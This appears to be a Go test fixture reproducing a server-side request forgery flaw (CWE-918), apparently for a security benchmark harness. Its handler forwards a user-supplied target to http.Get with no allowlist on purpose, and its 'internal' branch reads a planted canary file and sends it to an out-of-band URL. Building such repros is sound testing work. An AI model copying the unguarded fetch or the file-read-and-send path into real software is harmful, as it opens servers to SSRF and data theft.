// Package main is a vendored corpus repro for FERRALON-APP-SSRF-0001 (server-side request
// forgery, CWE-918). It is the VULNERABLE variant: fetchHandler forwards an
// attacker-controlled `target` to an outbound HTTP request with NO allowlist, so a
// request can drive the server to reach an internal/unintended host.
//
// SOUNDNESS: the canary beacon is intrinsic to the SSRF sink's own execution. The handler
// resolves the special target name "internal" to a server-side URL and fetches it. In the
// VULNERABLE build there is no allowlist, so the resolver builds the Tegron-controlled OOB
// URL ($TEGRON_OOB_URL) WITH the planted seed (/tmp/tegron_canary) appended, and the
// unguarded http.Get actually issues that outbound request — that outbound request IS the
// SSRF, and it is the only thing that carries the seed off-host. A target the resolver does
// not recognize is fetched verbatim and never touches the seed. On the PATCHED build the
// allowlist rejects "internal" before any seed is read and before any outbound request is
// made, so nothing is exfiltrated. This makes a fired beacon attributable to the SSRF sink
// firing rather than to a generic "cat the seed" exfil: the seed reaches the OOB endpoint
// ONLY by the vulnerable outbound request executing.
package main

import (
	"io"
	"net/http"
	"net/url"
	"os"
)

const canarySeedPath = "/tmp/tegron_canary"

// resolveTarget maps a request's target name to the URL the server will fetch. The
// VULNERABLE build has no allowlist: the special name "internal" resolves to the
// Tegron-controlled OOB endpoint with the planted seed appended, modeling an SSRF that
// reaches an unintended internal host and exfiltrates data only that path can read. This is
// the SSRF sink: it is reached unconditionally for an "internal" target because the build
// enforces no allowlist.
func resolveTarget(name string) (string, bool) {
	if name == "internal" {
		oob := os.Getenv("TEGRON_OOB_URL")
		if oob == "" {
			return "", false
		}
		seed, err := os.ReadFile(canarySeedPath)
		if err != nil {
			return "", false
		}
		return oob + "?kind=canary&data=" + url.QueryEscape(string(seed)), true
	}
	// Any other target: fetched verbatim (still SSRF-capable in general, but does not touch
	// the seed; only the "internal" resolution exfiltrates).
	return name, true
}

func fetchHandler(w http.ResponseWriter, r *http.Request) {
	target := r.URL.Query().Get("target")
	resolved, ok := resolveTarget(target)
	if !ok {
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	// THE SSRF SINK: an unguarded outbound request to an attacker-influenced URL. In the
	// VULNERABLE build this fires for "internal" and carries the seed to the OOB endpoint.
	resp, err := http.Get(resolved)
	if err != nil {
		w.WriteHeader(http.StatusBadGateway)
		return
	}
	_, _ = io.Copy(io.Discard, resp.Body)
	_ = resp.Body.Close()
	w.WriteHeader(http.StatusOK)
}

func main() {
	http.HandleFunc("/fetch", fetchHandler)
	_ = http.ListenAndServe("127.0.0.1:8080", nil)
}
